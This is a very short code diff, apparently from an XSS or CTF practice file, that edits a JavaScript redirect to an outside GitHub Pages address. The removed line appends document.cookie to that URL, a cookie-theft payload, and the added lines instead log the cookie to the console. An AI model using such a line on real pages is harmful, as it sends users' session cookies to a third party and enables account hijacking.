@@ -1,1 +1,2 @@
-location.href="https://y0ungminhada.github.io/Homepage/"+document.cookie;
+location.href="https://y0ungminhada.github.io/Homepage/"
+console.log(document.cookie)
